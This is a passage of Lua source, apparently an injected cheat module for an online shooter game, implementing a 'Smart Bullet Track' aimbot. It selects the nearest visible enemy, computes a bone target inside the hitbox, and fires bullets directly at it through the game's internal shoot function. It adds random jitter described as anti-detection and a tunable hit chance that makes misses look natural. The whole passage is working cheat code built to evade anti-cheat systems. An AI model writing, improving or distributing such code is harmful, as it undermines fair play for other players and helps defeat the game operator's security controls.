        local effectiveR = math.min(radiusCm, boneDef.capsule_r * 0.9)

        -- Uniform disk sample — equal probability across entire disk area
        local r   = effectiveR * math.sqrt(math.random())
        local ang = math.random() * math.pi * 2

        -- World-space horizontal plane offset (XY) + vertical capsule Z offset
        local offX = math.cos(ang) * r
        local offY = math.sin(ang) * r
        -- Z clamped to +-capsule_r*0.5 so stays inside capsule height
        local offZ = (math.random() - 0.5) * boneDef.capsule_r
    ...
    ----------------------------------------------------------------------------
    -- MUZZLE RESOLVE — 3 layers
    ----------------------------------------------------------------------------
    local function SBT_GetMuzzle(weapon, player)
        local mp = nil
        pcall(function()
            local we = weapon.ShootWeaponEntityComp
            if we and type(we.GetMuzzleLocation) == "function" then
                mp = we:GetMuzzleLocation()
            end
        end)
        if mp then return mp end

        pcall(function()
            local wLoc = weapon:K2_GetActorLocation()
            local wRot = weapon:K2_GetActorRotation()
            if wLoc and wRot then
                local fwd = wRot:GetForwardVector()
                mp = { X = wLoc.X + fwd.X*150, Y = wLoc.Y + fwd.Y*150, Z = wLoc.Z + fwd.Z*50 }
            end
        end)
        if mp then return mp end

        pcall(function()
            local bp = player:GetBonePos("head", nil)
            if bp and not (bp.X==0 and bp.Y==0 and bp.Z==0) then
                mp = { X = bp.X, Y = bp.Y, Z = bp.Z - 20 }
            end
        end)
        return mp
    end
    ...
    -- MAIN TICK
    ----------------------------------------------------------------------------
    local function SmartBulletTrack()
        if not (_G.LexusConfig and _G.LexusConfig.SmartBT_Enable) then return end
        ...
        pcall(function()
            ...
            if weapon ~= _sbt_LastWeapon then
                _sbt_LastWeapon  = weapon
                _sbt_LastShootId = -1
            end
            ...
            if curId == _sbt_LastShootId then return end
            _sbt_LastShootId = curId
            ...
            local maxDistCm = (cfg.SmartBT_MaxDist or 300) * 100

            -- Resolve bone for this tick
            local boneIdx = cfg.SmartBT_Bone or 1
            local resolvedIdx = boneIdx
            if boneIdx == 6 then
                resolvedIdx = FB_CYCLE[_G._SBT_CYCLE_IDX]
                _G._SBT_CYCLE_IDX = (_G._SBT_CYCLE_IDX % #FB_CYCLE) + 1
            end
            local boneDef  = BONE_DEF[resolvedIdx] or BONE_DEF[1]
            local radiusCm = cfg.SmartBT_Radius or 0

            _G.SBT_VisCache = _G.SBT_VisCache or {}
            local curTime   = os.clock()

            local enemies   = SBT_GetEnemies(player, myTeam)
            local bestDist  = math.huge
            local bestEnemy = nil

            for _, enemy in pairs(enemies) do
                if not slua.isValid(enemy) then goto sbt_next end

                if cfg.SmartBT_IgKnock then
                    if enemy.HealthStatus == 1 then goto sbt_next end
                    local alive = false
                    pcall(function() alive = enemy:IsAlive() end)
                    if not alive then goto sbt_next end
                end

                if cfg.SmartBT_IgBot then
                    local isBot = (enemy.bIsAI == true or enemy.IsAI == true)
                    if not isBot then
                        local ps = enemy.PlayerState
                        if slua.isValid(ps) and (ps.bIsABot or ps.bIsBot) then isBot = true end
                    end
                    if isBot then goto sbt_next end
                end

                local eLoc = nil
                pcall(function() eLoc = enemy:K2_GetActorLocation() end)
                if not eLoc then goto sbt_next end
                do
                    local dx = eLoc.X - camLoc.X
                    local dy = eLoc.Y - camLoc.Y
                    local dz = eLoc.Z - camLoc.Z
                    if (dx*dx + dy*dy + dz*dz) > (maxDistCm * maxDistCm) then goto sbt_next end
                end

                if cfg.SmartBT_VisCheck then
                    local uid = type(enemy.GetUniqueID) == "function" and enemy:GetUniqueID() or tostring(enemy)
                    local entry = _G.SBT_VisCache[uid]
                    if not entry or (curTime - entry.time) > 0.2 then
                        local visible = false
                        pcall(function() visible = pc:LineOfSightTo(enemy) end)
                        entry = { hidden = not visible, time = curTime }
                        _G.SBT_VisCache[uid] = entry
                    end
                    if entry.hidden then goto sbt_next end
                end

                -- Sort by screen-center distance (head used for proximity sort only)
                local headPos = nil
                pcall(function()
                    local p = enemy:GetBonePos("head", nil)
                    if p and not (p.X==0 and p.Y==0 and p.Z==0) then headPos = p end
                end)
                if not headPos then
                    headPos = { X = eLoc.X, Y = eLoc.Y, Z = eLoc.Z + 70 }
                end

                local sc = FVector2D()
                local ok = pc:ProjectWorldLocationToScreen(headPos, sc, false)
                if not ok or sc.X <= 0 or sc.Y <= 0 then goto sbt_next end
            ...
            if not slua.isValid(bestEnemy) then return end

            -- Resolve target bone (4-layer fallback)
            local targetPos = SBT_ResolveBonePos(bestEnemy, boneDef)
            if not targetPos then return end

            -- Apply radius clamped inside actual hitbox
            targetPos = SBT_ApplyRadius(targetPos, boneDef, radiusCm)

            -- Muzzle position
            local muzzlePos = SBT_GetMuzzle(weapon, player)
            if not muzzlePos then return end

            local KML = import("KismetMathLibrary")
            local rot = KML.FindLookAtRotation(muzzlePos, targetPos)
            if not rot then return end

            -- Sub-pixel jitter (anti-cluster detection)
            local rs = 0.0003
            rot.Pitch = rot.Pitch + (math.random() - 0.5) * rs
            rot.Yaw   = rot.Yaw   + (math.random() - 0.5) * rs

            -- Hit-chance gate: rolls per bullet, miss = redirect to sky so
            -- the gun still fires (no stall) but no damage registers
            local hitChance = cfg.SmartBT_HitChance
            if hitChance == nil then hitChance = 70 end
            local roll = math.random(0, 99)
            if roll < hitChance then
                -- HIT: fire at resolved bone target
                shootComp:ShootBulletInner(targetPos, rot, curId)
            else
                -- MISS: intentional near-miss — deflect slightly outside capsule
                local missAngle = math.random() * math.pi * 2
                local missDist  = (BONE_DEF[resolvedIdx] or BONE_DEF[1]).capsule_r * 2.5
                local missPos = {
                    X = targetPos.X + math.cos(missAngle) * missDist,
                    Y = targetPos.Y + math.sin(missAngle) * missDist,
                    Z = targetPos.Z + (math.random() - 0.5) * missDist * 0.6,
                }
                local missRot = KML.FindLookAtRotation(muzzlePos, missPos)
                if missRot then
                    shootComp:ShootBulletInner(missPos, missRot, curId)
                end
            end
        end)
    end

    local sbt_ticker = require("common.time_ticker")
    local function _sbtLoop()
        pcall(SmartBulletTrack)
        sbt_ticker.AddTimerOnce(0.08, _sbtLoop)
    end
    sbt_ticker.AddTimerOnce(0.6, _sbtLoop)

    print("[SmartBT v2] Loop started — fixed bone resolution + hitbox-clamped radius")
end
end)
